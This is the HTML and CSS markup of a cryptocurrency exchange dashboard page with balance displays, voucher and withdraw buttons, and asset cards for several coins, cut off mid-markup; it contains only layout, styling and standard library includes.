<!DOCTYPE html>
<html lang="en">

<head>
    <title>WIREX EXCHANGE DASHBOARD</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <style>
        /* Set height of the grid so .sidenav can be 100% (adjust as needed) */
        .row.content {
            height: 550px
        }

        /* Set gray background color and 100% height */
        .sidenav {
            background-color: #f1f1f1;
            height: 100%;
        }

        /* On small screens, set height to 'auto' for the grid */
        @media screen and (max-width: 767px) {
            .row.content {
                height: auto;
            }

        }

        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }

        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #f9f9f9;
            padding: 0px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            max-width: 300px;
        }

        .close {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 20px;
            cursor: pointer;
            color: #666;
        }

        .popup h2 {
            margin-top: 0;
            color: #333;
        }

        .popup input[type="text"] {
            width: 100%;
            padding: 15px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
        }

        .popup button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        .popup button:hover {
            background-color: #0056b3;
        }

        .bal {
            background-color: rgb(158, 149, 149);
            padding-top: 50px;
            padding-bottom: 50px;
            border-radius: 5px;
            padding-left: 5px;
            color: white;
            text-decoration: wavy;
            text-decoration: solid;




        }

        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f9fa;
            color: #333;
        }

        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 0 20px;
            margin-left: 0px;
        }

        /* Styles for links */
        .link {
            display: block;
            margin-bottom: 10px;
            text-decoration: none;
            color: #007bff;
            font-size: 18px;
        }

        /* Styles for pop-ups */
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }

        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            max-width: 300px;
            text-align: center;
            /* Centering image */
        }

        .close {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 24px;
            cursor: pointer;
            color: #999;
        }

        .close:hover {
            color: #333;
        }

        .popup h2 {
            margin-top: 0;
            color: #333;
        }

        .popup img {
            width: 100px;
            /* Set the width of the image */
            height: auto;
            /* Maintain aspect ratio */
            margin-bottom: 20px;
            /* Add some space below the image */
        }

        .popup button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 50px;
        }

        .popup button:hover {
            background-color: #0056b3;
        }

        /* Styles for BTC balance */
        #btcBalance {
            font-size: 24px;
            margin-bottom: 10px;
        }

        /* Styles for transaction history */
        #transactionHistory {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            max-width: 80%;
            max-height: 80%;
            overflow-y: auto;
        }

        #transactionHistory h2 {
            margin-top: 0;
            margin-bottom: 20px;
            color: #333;
        }

        #transactionHistory ul {
            list-style-type: none;
            padding: 0;
            margin: 0;
        }

        #transactionHistory li {
            margin-bottom: 10px;
        }

        /* Styles for transaction history */
        #transactionHistory {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            max-width: 80%;
            max-height: 80%;
            overflow-y: auto;
        }

        #transactionHistory h2 {
            margin-top: 0;
            margin-bottom: 20px;
            color: #333;
        }

        #transactionHistory ul {
            list-style-type: none;
            padding: 0;
            margin: 0;
        }

        #transactionHistory li {
            margin-bottom: 10px;
        }

        .dep {
            background-color: green;
            border: none;

        }

        .button {
            border-radius: 4px;
            background-color: #f4511e;
            border: none;
            color: #FFFFFF;
            text-align: center;
            font-size: 20px;
            padding-left: 10px;
            padding-bottom: 5px;
            padding-top: 5px;
            width: 150px;
            transition: all 0.5s;
            cursor: pointer;
            margin: 5px;
        }

        .button span {
            cursor: pointer;
            display: inline-block;
            position: relative;
            transition: 0.5s;
        }

        .button span:after {
            content: '\00bb';
            position: absolute;
            opacity: 0;
            top: 0;
            right: -20px;
            transition: 0.5s;
        }

        .button:hover span {
            padding-right: 30px;
        }

        .button:hover span:after {
            opacity: 1;
            right: 0;
        }

        container {
            max-width: 800px;
            margin: 20px auto;
            padding: 0 20px;
        }

        .asset-list {
            list-style: none;
            padding: 0;
        }

        .asset-item {
            background-color: #fff;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: column;
        }

        .asset-details {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }

        .asset-name {
            font-size: 20px;
            color: #333;
            margin-right: 20px;
        }

        .asset-balance {
            font-size: 20px;
            color: #333;
            margin-right: 20px;
        }

        .logo {
            width: 30px;
            height: 30px;
            margin-right: 10px;
            font-size: larger;
        }

        .buttons {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 10px;
        }

        .button {
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            cursor: pointer;
            transition: background-color 0.3s;
            width: 120px;
            /* Fixed width for buttons */
        }

        .button:hover {
            background-color: #0056b3;
        }

        @media screen and (max-width: 600px) {
            .asset-item {
                padding: 10px;
            }

            .asset-details {
                flex-direction: column;
                align-items: flex-start;
            }

            .asset-name {
                font-size: 18px;
                margin-bottom: 5px;
            }

            .asset-balance {
                font-size: 18px;
                margin-bottom: 5px;
            }

            .buttons {
                flex-direction: column;
                align-items: flex-start;
                margin-top: 10px;
            }

            .button {
                margin-top: 5px;
            }
        }

        .well {
            margin-top: 20px;
            padding-bottom: 30px;

        }

        .lofo {
            font-size: 30px;
            color: white;
        }

        .popup {
            width: 500px;
            /* Adjust width as needed */
            height: 400px;
            /* Adjust height as needed */
        }

        .button4 {
            background-color: #ff0000;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 15px 20px;
            cursor: pointer;
            transition: background-color 0.3s;
            width: 120px;
            /* Fixed width for buttons */
            margin-top: 5px;
            flex-direction: column;
            align-items: flex-start;
            margin-top: 15px;
            margin-left: 17px;
            font-weight: bolder;




        }

        .navbar-header {
            background-color: white;
            outline: none;
        }

        .navbar-toggle {
            background-color: black;
        }

        /* Custom select dropdown styles */
        .custom-select {
            position: relative;
            display: inline-block;
        }

        .custom-select select {
            display: none;
        }

        .select-styled {
            display: inline-block;
            padding: 10px 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
            cursor: pointer;
        }

        .select-styled:after {
            content: '';
            position: absolute;
            top: 50%;
            right: 10px;
            margin-top: -3px;
            border-width: 6px;
            border-style: solid;
            border-color: #000 transparent transparent transparent;
        }

        .popup-content select {
            display: block;
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
            cursor: pointer;
        }

        .popup-content select:focus {
            outline: none;
            border-color: #007bff;
            /* Change border color on focus */
        }

        .popup-content select option {
            padding: 10px;
        }

        .popup {
            height: 90%;
            /* Adjust the height as needed */
        }
    </style>
</head>

<body>

    <nav class="navbar navbar-inverse visible-xs">
        <div class="container-fluid">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <img src="images/logo.png" alt="" height="50px">
            </div>
            <div class="collapse navbar-collapse" id="myNavbar">
                <ul class="nav navbar-nav">

                    <li class="wallet__menu-item active">
                        <a href="#" class="wallet__menu-link">
                            <svg class="wallet__menu-img" xmlns="http://www.w3.org/2000/svg" width="16"
                                height="16" viewBox="0 0 16 16" fill="none">
                                <path
                                    d="M8 3.2C7.78783 3.2 7.58434 3.28429 7.43431 3.43431C7.28429 3.58434 7.2 3.78783 7.2 4V12C7.2 12.2122 7.28429 12.4157 7.43431 12.5657C7.58434 12.7157 7.78783 12.8 8 12.8C8.21217 12.8 8.41566 12.7157 8.56569 12.5657C8.71571 12.4157 8.8 12.2122 8.8 12V4C8.8 3.78783 8.71571 3.58434 8.56569 3.43431C8.41566 3.28429 8.21217 3.2 8 3.2ZM4 8C3.78783 8 3.58434 8.08429 3.43431 8.23431C3.28429 8.38434 3.2 8.58783 3.2 8.8V12C3.2 12.2122 3.28429 12.4157 3.43431 12.5657C3.58434 12.7157 3.78783 12.8 4 12.8C4.21217 12.8 4.41566 12.7157 4.56569 12.5657C4.71571 12.4157 4.8 12.2122 4.8 12V8.8C4.8 8.58783 4.71571 8.38434 4.56569 8.23431C4.41566 8.08429 4.21217 8 4 8ZM12 6.4C11.7878 6.4 11.5843 6.48429 11.4343 6.63432C11.2843 6.78434 11.2 6.98783 11.2 7.2V12C11.2 12.2122 11.2843 12.4157 11.4343 12.5657C11.5843 12.7157 11.7878 12.8 12 12.8C12.2122 12.8 12.4157 12.7157 12.5657 12.5657C12.7157 12.4157 12.8 12.2122 12.8 12V7.2C12.8 6.98783 12.7157 6.78434 12.5657 6.63432C12.4157 6.48429 12.2122 6.4 12 6.4ZM13.6 0H2.4C1.76348 0 1.15303 0.252856 0.702944 0.702944C0.252856 1.15303 0 1.76348 0 2.4V13.6C0 14.2365 0.252856 14.847 0.702944 15.2971C1.15303 15.7471 1.76348 16 2.4 16H13.6C14.2365 16 14.847 15.7471 15.2971 15.2971C15.7471 14.847 16 14.2365 16 13.6V2.4C16 1.76348 15.7471 1.15303 15.2971 0.702944C14.847 0.252856 14.2365 0 13.6 0ZM14.4 13.6C14.4 13.8122 14.3157 14.0157 14.1657 14.1657C14.0157 14.3157 13.8122 14.4 13.6 14.4H2.4C2.18783 14.4 1.98434 14.3157 1.83431 14.1657C1.68429 14.0157 1.6 13.8122 1.6 13.6V2.4C1.6 2.18783 1.68429 1.98434 1.83431 1.83431C1.98434 1.68429 2.18783 1.6 2.4 1.6H13.6C13.8122 1.6 14.0157 1.68429 14.1657 1.83431C14.3157 1.98434 14.4 2.18783 14.4 2.4V13.6Z"
                                    fill="#3D158B" />
                            </svg>
                            <span class="wallet__menu-link__text" style="color: wheat;">Overview</span>
                        </a>
                    </li>


                    <div class="wallet__menu-item wallet__gift">
                        <a href="#" class="wallet__menu-link">
                            <svg class="wallet__menu-img" xmlns="http://www.w3.org/2000/svg" width="24"
                                height="25" viewBox="0 0 24 25" fill="none">
                                <path
                                    d="M6.08658 21.1013L5.78803 21.7893L6.08658 21.1013ZM3.3806 18.2664L2.68314 18.5422L3.3806 18.2664ZM20.6194 18.2664L21.3169 18.5422L20.6194 18.2664ZM17.9134 21.1013L18.212 21.7893L17.9134 21.1013ZM12 20.5H12.75H12ZM3.04233 11.0313L2.60455 11.6403H2.60455L3.04233 11.0313ZM10.5 20.75C9.3244 20.75 8.48204 20.7496 7.81769 20.7021C7.1608 20.6551 6.73463 20.5649 6.38514 20.4133L5.78803 21.7893C6.3574 22.0364 6.97308 22.1455 7.71075 22.1983C8.44097 22.2504 9.34589 22.25 10.5 22.25V20.75ZM2.25 13.6429C2.25 14.8534 2.24963 15.7971 2.29916 16.5577C2.34909 17.3243 2.45201 17.9576 2.68314 18.5422L4.07806 17.9907C3.92859 17.6126 3.84121 17.1545 3.79599 16.4602C3.75037 15.7597 3.75 14.873 3.75 13.6429H2.25ZM6.38514 20.4133C5.34904 19.9637 4.51518 19.0962 4.07806 17.9907L2.68314 18.5422C3.26097 20.0036 4.37384 21.1756 5.78803 21.7893L6.38514 20.4133ZM20.25 13.6429C20.25 14.873 20.2496 15.7597 20.204 16.4602C20.1588 17.1545 20.0714 17.6126 19.9219 17.9907L21.3169 18.5422C21.548 17.9576 21.6509 17.3243 21.7008 16.5577C21.7504 15.7971 21.75 14.8534 21.75 13.6429H20.25ZM13.5 22.25C14.6541 22.25 15.559 22.2504 16.2893 22.1983C17.0269 22.1455 17.6426 22.0364 18.212 21.7893L17.6149 20.4133C17.2654 20.5649 16.8392 20.6551 16.1823 20.7021C15.518 20.7496 14.6756 20.75 13.5 20.75V22.25ZM19.9219 17.9907C19.4848 19.0962 18.651 19.9637 17.6149 20.4133L18.212 21.7893C19.6262 21.1756 20.739 20.0036 21.3169 18.5422L19.9219 17.9907ZM3.75 13.6429C3.75 12.1696 3.68173 11.8013 3.74703 11.0664L2.25291 10.9336C2.18073 11.746 2.25 12.357 2.25 13.6429H3.75ZM19.5 7.25C20.4665 7.25 21.25 8.0335 21.25 9H22.75C22.75 7.20507 21.2949 5.75 19.5 5.75V7.25ZM4.5 5.75C2.70507 5.75 1.25 7.20507 1.25 9H2.75C2.75 8.0335 3.5335 7.25 4.5 7.25V5.75ZM11.25 6.5L11.25 20.5H12.75L12.75 6.5H11.25ZM14 5.75H12V7.25H14V5.75ZM12.75 6.5V4.5H11.25V6.5H12.75ZM15.25 4.5C15.25 5.19036 14.6904 5.75 14 5.75V7.25C15.5188 7.25 16.75 6.01878 16.75 4.5H15.25ZM14 3.25C14.6904 3.25 15.25 3.80964 15.25 4.5H16.75C16.75 2.98122 15.5188 1.75 14 1.75V3.25ZM14 1.75C12.4812 1.75 11.25 2.98122 11.25 4.5H12.75C12.75 3.80964 13.3096 3.25 14 3.25V1.75ZM10 7.25H12V5.75H10V7.25ZM7.25 4.5C7.25 6.01878 8.48122 7.25 10 7.25V5.75C9.30964 5.75 8.75 5.19036 8.75 4.5H7.25ZM10 1.75C8.48122 1.75 7.25 2.98122 7.25 4.5H8.75C8.75 3.80964 9.30964 3.25 10 3.25V1.75ZM10 3.25C10.6904 3.25 11.25 3.80964 11.25 4.5H12.75C12.75 2.98122 11.5188 1.75 10 1.75V3.25ZM4.5 7.25H12V5.75H4.5V7.25ZM12 7.25H19.5V5.75H12V7.25ZM13.5 20.75H12V22.25H13.5V20.75ZM12 20.75H10.5V22.25H12V20.75ZM11.25 20.5L11.25 21.5H12.75L12.75 20.5H11.25ZM19.5 10.75H12V12.25H19.5V10.75ZM12 10.75H4.5V12.25H12V10.75ZM4.5 10.75C4.11829 10.75 3.76714 10.6287 3.48011 10.4223L2.60455 11.6403C3.13821 12.0239 3.79381 12.25 4.5 12.25V10.75ZM3.48011 10.4223C3.03646 10.1034 2.75 9.58516 2.75 9H1.25C1.25 10.0884 1.78572 11.0516 2.60455 11.6403L3.48011 10.4223ZM21.25 9C21.25 9.59197 20.9568 10.1155 20.5043 10.4334L21.3665 11.6608C22.2017 11.0742 22.75 10.1012 22.75 9H21.25ZM20.5043 10.4334C20.2202 10.633 19.8749 10.75 19.5 10.75V12.25C20.1934 12.25 20.8381 12.032 21.3665 11.6608L20.5043 10.4334ZM21.75 13.6429C21.75 12.2979 21.7505 11.7674 21.6826 10.9825L20.1882 11.1118C20.2495 11.8207 20.25 12.2851 20.25 13.6429H21.75Z"
                                    fill="#3D158B" />
                            </svg>
                            <span class="wallet__menu-link__text" id="Pop-up2"><a href="#" id="popupToggle2"
                                    style="color: wheat;">Voucher</a></span>

                        </a>
                    </div>

                </ul>
            </div>
        </div>
    </nav>

    <div class="container-fluid">
        <div class="row content">
            <div class="col-sm-3 sidenav hidden-xs">
                <br>
                <br>
                <ul class="nav nav-pills nav-stacked">
                    <li class="wallet__menu-item active">
                        <a href="#" class="wallet__menu-link">
                            <svg class="wallet__menu-img" xmlns="http://www.w3.org/2000/svg" width="16"
                                height="16" viewBox="0 0 16 16" fill="none">
                                <path
                                    d="M8 3.2C7.78783 3.2 7.58434 3.28429 7.43431 3.43431C7.28429 3.58434 7.2 3.78783 7.2 4V12C7.2 12.2122 7.28429 12.4157 7.43431 12.5657C7.58434 12.7157 7.78783 12.8 8 12.8C8.21217 12.8 8.41566 12.7157 8.56569 12.5657C8.71571 12.4157 8.8 12.2122 8.8 12V4C8.8 3.78783 8.71571 3.58434 8.56569 3.43431C8.41566 3.28429 8.21217 3.2 8 3.2ZM4 8C3.78783 8 3.58434 8.08429 3.43431 8.23431C3.28429 8.38434 3.2 8.58783 3.2 8.8V12C3.2 12.2122 3.28429 12.4157 3.43431 12.5657C3.58434 12.7157 3.78783 12.8 4 12.8C4.21217 12.8 4.41566 12.7157 4.56569 12.5657C4.71571 12.4157 4.8 12.2122 4.8 12V8.8C4.8 8.58783 4.71571 8.38434 4.56569 8.23431C4.41566 8.08429 4.21217 8 4 8ZM12 6.4C11.7878 6.4 11.5843 6.48429 11.4343 6.63432C11.2843 6.78434 11.2 6.98783 11.2 7.2V12C11.2 12.2122 11.2843 12.4157 11.4343 12.5657C11.5843 12.7157 11.7878 12.8 12 12.8C12.2122 12.8 12.4157 12.7157 12.5657 12.5657C12.7157 12.4157 12.8 12.2122 12.8 12V7.2C12.8 6.98783 12.7157 6.78434 12.5657 6.63432C12.4157 6.48429 12.2122 6.4 12 6.4ZM13.6 0H2.4C1.76348 0 1.15303 0.252856 0.702944 0.702944C0.252856 1.15303 0 1.76348 0 2.4V13.6C0 14.2365 0.252856 14.847 0.702944 15.2971C1.15303 15.7471 1.76348 16 2.4 16H13.6C14.2365 16 14.847 15.7471 15.2971 15.2971C15.7471 14.847 16 14.2365 16 13.6V2.4C16 1.76348 15.7471 1.15303 15.2971 0.702944C14.847 0.252856 14.2365 0 13.6 0ZM14.4 13.6C14.4 13.8122 14.3157 14.0157 14.1657 14.1657C14.0157 14.3157 13.8122 14.4 13.6 14.4H2.4C2.18783 14.4 1.98434 14.3157 1.83431 14.1657C1.68429 14.0157 1.6 13.8122 1.6 13.6V2.4C1.6 2.18783 1.68429 1.98434 1.83431 1.83431C1.98434 1.68429 2.18783 1.6 2.4 1.6H13.6C13.8122 1.6 14.0157 1.68429 14.1657 1.83431C14.3157 1.98434 14.4 2.18783 14.4 2.4V13.6Z"
                                    fill="#3D158B" />
                            </svg>
                            <span class="wallet__menu-link__text">Overview</span>
                        </a>
                    </li>




                    </a>
                    </li>


                    <li class="wallet__menu-item wallet__transfer">
                        <a href="#" class="wallet__menu-link">
                            <svg class="wallet__menu-img" xmlns="http://www.w3.org/2000/svg" width="13"
                                height="17" viewBox="0 0 13 17" fill="none">
                                <path
                                    d="M12.272 11.7C12.2285 11.6028 12.169 11.5135 12.096 11.436L8.39199 7.69999C8.23895 7.56893 8.04209 7.50045 7.84075 7.50822C7.63941 7.516 7.44842 7.59947 7.30594 7.74194C7.16347 7.88442 7.08 8.07541 7.07222 8.27675C7.06445 8.47809 7.13293 8.67495 7.26399 8.82799L9.59999 11.164H4C3.36348 11.164 2.75303 10.9111 2.30294 10.461C1.85285 10.011 1.6 9.40051 1.6 8.76399V1.3C1.6 1.08783 1.51571 0.884343 1.36568 0.734314C1.21566 0.584285 1.01217 0.5 0.799999 0.5C0.587826 0.5 0.384344 0.584285 0.234315 0.734314C0.0842856 0.884343 0 1.08783 0 1.3V8.79599C0 9.85686 0.421427 10.8743 1.17157 11.6244C1.92172 12.3746 2.93913 12.796 4 12.796H9.59999L7.26399 15.132C7.18901 15.2064 7.1295 15.2948 7.08888 15.3923C7.04827 15.4898 7.02736 15.5944 7.02736 15.7C7.02736 15.8056 7.04827 15.9102 7.08888 16.0076C7.1295 16.1051 7.18901 16.1936 7.26399 16.268C7.33875 16.3421 7.4274 16.4008 7.52487 16.4406C7.62234 16.4804 7.72671 16.5006 7.83199 16.5C8.04187 16.4991 8.24298 16.4158 8.39199 16.268L12.096 12.564C12.1717 12.4886 12.2315 12.3989 12.272 12.3C12.3498 12.1076 12.3498 11.8924 12.272 11.7Z"
                                    fill="#3D158B" />
                            </svg>
                            <span class="wallet__menu-link__text">Transfer</span>
                        </a>
                    </li>

                    <div class="wallet__menu-item wallet__gift">
                        <a href="#" class="wallet__menu-link">
                            <svg class="wallet__menu-img" xmlns="http://www.w3.org/2000/svg" width="24"
                                height="25" viewBox="0 0 24 25" fill="none">
                                <path
                                    d="M6.08658 21.1013L5.78803 21.7893L6.08658 21.1013ZM3.3806 18.2664L2.68314 18.5422L3.3806 18.2664ZM20.6194 18.2664L21.3169 18.5422L20.6194 18.2664ZM17.9134 21.1013L18.212 21.7893L17.9134 21.1013ZM12 20.5H12.75H12ZM3.04233 11.0313L2.60455 11.6403H2.60455L3.04233 11.0313ZM10.5 20.75C9.3244 20.75 8.48204 20.7496 7.81769 20.7021C7.1608 20.6551 6.73463 20.5649 6.38514 20.4133L5.78803 21.7893C6.3574 22.0364 6.97308 22.1455 7.71075 22.1983C8.44097 22.2504 9.34589 22.25 10.5 22.25V20.75ZM2.25 13.6429C2.25 14.8534 2.24963 15.7971 2.29916 16.5577C2.34909 17.3243 2.45201 17.9576 2.68314 18.5422L4.07806 17.9907C3.92859 17.6126 3.84121 17.1545 3.79599 16.4602C3.75037 15.7597 3.75 14.873 3.75 13.6429H2.25ZM6.38514 20.4133C5.34904 19.9637 4.51518 19.0962 4.07806 17.9907L2.68314 18.5422C3.26097 20.0036 4.37384 21.1756 5.78803 21.7893L6.38514 20.4133ZM20.25 13.6429C20.25 14.873 20.2496 15.7597 20.204 16.4602C20.1588 17.1545 20.0714 17.6126 19.9219 17.9907L21.3169 18.5422C21.548 17.9576 21.6509 17.3243 21.7008 16.5577C21.7504 15.7971 21.75 14.8534 21.75 13.6429H20.25ZM13.5 22.25C14.6541 22.25 15.559 22.2504 16.2893 22.1983C17.0269 22.1455 17.6426 22.0364 18.212 21.7893L17.6149 20.4133C17.2654 20.5649 16.8392 20.6551 16.1823 20.7021C15.518 20.7496 14.6756 20.75 13.5 20.75V22.25ZM19.9219 17.9907C19.4848 19.0962 18.651 19.9637 17.6149 20.4133L18.212 21.7893C19.6262 21.1756 20.739 20.0036 21.3169 18.5422L19.9219 17.9907ZM3.75 13.6429C3.75 12.1696 3.68173 11.8013 3.74703 11.0664L2.25291 10.9336C2.18073 11.746 2.25 12.357 2.25 13.6429H3.75ZM19.5 7.25C20.4665 7.25 21.25 8.0335 21.25 9H22.75C22.75 7.20507 21.2949 5.75 19.5 5.75V7.25ZM4.5 5.75C2.70507 5.75 1.25 7.20507 1.25 9H2.75C2.75 8.0335 3.5335 7.25 4.5 7.25V5.75ZM11.25 6.5L11.25 20.5H12.75L12.75 6.5H11.25ZM14 5.75H12V7.25H14V5.75ZM12.75 6.5V4.5H11.25V6.5H12.75ZM15.25 4.5C15.25 5.19036 14.6904 5.75 14 5.75V7.25C15.5188 7.25 16.75 6.01878 16.75 4.5H15.25ZM14 3.25C14.6904 3.25 15.25 3.80964 15.25 4.5H16.75C16.75 2.98122 15.5188 1.75 14 1.75V3.25ZM14 1.75C12.4812 1.75 11.25 2.98122 11.25 4.5H12.75C12.75 3.80964 13.3096 3.25 14 3.25V1.75ZM10 7.25H12V5.75H10V7.25ZM7.25 4.5C7.25 6.01878 8.48122 7.25 10 7.25V5.75C9.30964 5.75 8.75 5.19036 8.75 4.5H7.25ZM10 1.75C8.48122 1.75 7.25 2.98122 7.25 4.5H8.75C8.75 3.80964 9.30964 3.25 10 3.25V1.75ZM10 3.25C10.6904 3.25 11.25 3.80964 11.25 4.5H12.75C12.75 2.98122 11.5188 1.75 10 1.75V3.25ZM4.5 7.25H12V5.75H4.5V7.25ZM12 7.25H19.5V5.75H12V7.25ZM13.5 20.75H12V22.25H13.5V20.75ZM12 20.75H10.5V22.25H12V20.75ZM11.25 20.5L11.25 21.5H12.75L12.75 20.5H11.25ZM19.5 10.75H12V12.25H19.5V10.75ZM12 10.75H4.5V12.25H12V10.75ZM4.5 10.75C4.11829 10.75 3.76714 10.6287 3.48011 10.4223L2.60455 11.6403C3.13821 12.0239 3.79381 12.25 4.5 12.25V10.75ZM3.48011 10.4223C3.03646 10.1034 2.75 9.58516 2.75 9H1.25C1.25 10.0884 1.78572 11.0516 2.60455 11.6403L3.48011 10.4223ZM21.25 9C21.25 9.59197 20.9568 10.1155 20.5043 10.4334L21.3665 11.6608C22.2017 11.0742 22.75 10.1012 22.75 9H21.25ZM20.5043 10.4334C20.2202 10.633 19.8749 10.75 19.5 10.75V12.25C20.1934 12.25 20.8381 12.032 21.3665 11.6608L20.5043 10.4334ZM21.75 13.6429C21.75 12.2979 21.7505 11.7674 21.6826 10.9825L20.1882 11.1118C20.2495 11.8207 20.25 12.2851 20.25 13.6429H21.75Z"
                                    fill="#3D158B" />
                            </svg>
                            <span class="wallet__menu-link__text" id="Pop-up"><a href="#"
                                    id="popupToggle1">Voucher</a></span>
                        </a>
                    </div>

                </ul><br>
            </div>
            <br>

            <div class="col-sm-9">
                <div class="well">
                    <h2><b>OVERVIEW</b></h2>
                    <!-- BTC balance -->
                    <!-- BTC balance -->
                    <h6 class=""><b>Total Balance</b></h6>
                    <div id="btcBalance" class="bal"> <b><span id="btcBalanceValue">0</span> BTC</b></div>


                </div>
                <h1>Account Balances</h1>
                <div class="row">
                    <div class="col-sm-3">
                        <div class="well">
                            <a href="index.html"> <button class="button4"><span>Deposit </span></button></a>
                            <a href="#" id="withdrawButton"><button class="button4"><span>Withdraw
                                    </span></button></a>

                        </div>
                    </div>

                    <div class="container">
                        <ul class="asset-list">
                            <li class="asset-item">
                                <div class="asset-details">
                                    <img class="logo" src="images/btc.png" alt="">
                                    <span class="asset-name">Bitcoin (BTC)</span>
                                </div>

                                <div id="btcBalance" class="" style="font-size: medium;"> <span
                                        id="btcBalanceValue2">0</span> BTC</div>
                                <div class="buttons">
                                    <button class="button">Deposit</button>
                                    <button class="button">Withdraw</button>
                                    <button class="button">Transfer</button>
                                </div>
                            </li>
                            <!-- Repeat the following list item structure for other assets -->
                            <!-- Make sure to include media queries within <style> tags -->
                        </ul>
                    </div>


                    <div class="container">
                        <ul class="asset-list">
                            <li class="asset-item">
                                <div class="asset-details">
                                    <img width="64" height="64"
                                        src="https://img.icons8.com/nolan/64/ethereum.png" alt="ethereum" />
                                    <span class="asset-name">Ethereum (ETH)</span>
                                </div>
                                <span class="asset-balance">$0.00</span>
                                <div class="buttons">
                                    <button class="button">Deposit</button>
                                    <button class="button">Withdraw</button>
                                    <button class="button">Transfer</button>
                                </div>
                            </li>
                            <!-- Repeat the following list item structure for other assets -->
                            <!-- Make sure to include media queries within <style> tags -->
                        </ul>
                    </div>


                    <div class="container">
                        <ul class="asset-list">
                            <li class="asset-item">
                                <div class="asset-details">
                                    <img width="48" height="48"
                                        src="https://img.icons8.com/fluency/48/ripple.png" alt="ripple" />
                                    <span class="asset-name">Ripple (XRP)</span>
                                </div>
                                <span class="asset-balance">$0.00</span>
                                <div class="buttons">
                                    <button class="button">Deposit</button>
                                    <button class="button">Withdraw</button>
                                    <button class="button">Transfer</button>
                                </div>
                            </li>
                            <!-- Repeat the following list item structure for other assets -->
                            <!-- Make sure to include media queries within <style> tags -->
                        </ul>
                    </div>


                    <div class="container">
                        <ul class="asset-list">
                            <li class="asset-item">
                                <div class="asset-details">
                                    <img width="48" height="48"
                                        src="https://img.icons8.com/fluency/48/litecoin.png" alt="litecoin" />
                                    <span class="asset-name">Litecoin (LTC)</span>
                                </div>
                                <span class="asset-balance">$0.00</span>
                                <div class="buttons">
                                    <button class="button">Deposit</button>
                                    <button class="button">Withdraw</button>
                                    <button class="button">Transfer</button>
                                </div>
                            </li>
                            <!-- Repeat the following list item structure for other assets -->
                            <!-- Make sure to include media queries within <style> tags -->
                        </ul>
                    </div>



                    <div class="container">
                        <ul class="asset-list">
                            <li class="asset-item">
                                <div class="asset-details">
                                    <img width="64" height="64"
                                        src="https://img.icons8.com/external-black-fill-lafs/64/external-Bitcoin-Cash-cryptocurrency-black-fill-lafs.png"
                                        alt="external-Bitcoin-Cash-cryptocurrency-black-fill-lafs" />
                                    <span class="asset-name">Bitcoin Cash (BCH)</span>
                                </div>
                                <span class="asset-balance">$0.00</span>
                                <div class="buttons">
                                    <button class="button">Deposit</button>
                                    <button class="button">Withdraw</button>
                                    <button class="button">Transfer</button>
                                </div>
                            </li>
                            <!-- Repeat the following list item structure for other assets -->
                            <!-- Make sure to include media queries within <style> tags -->
                        </ul>
                    </div>


                    <div class="container">
                        <ul class="asset-list">
                            <li class="asset-item">
                                <div class="asset-details">
                                    <img width="64" height="64"
                                        src="https://img.icons8.com/dusk/64/binance.png" alt="binance" />
                                    <span class="asset-name">Binance Coin (BNB)</span>
                                </div>
                                <span class="asset-balance">$0.00</span>
                                <div class="buttons">
                                    <button class="button">Deposit</button>
                                    <button class="button">Withdraw</button>
                                    <button class="button">Transfer</button>
                                </div>
                            </li>
                            <!-- Repeat the following list item structure for other assets -->
                            <!-- Make sure to include media queries within <style> tags -->
                        </ul>
                    </div>


                    <div class="container">
                        <ul class="asset-list">
                            <li class="asset-item">
                                <div class="asset-details">
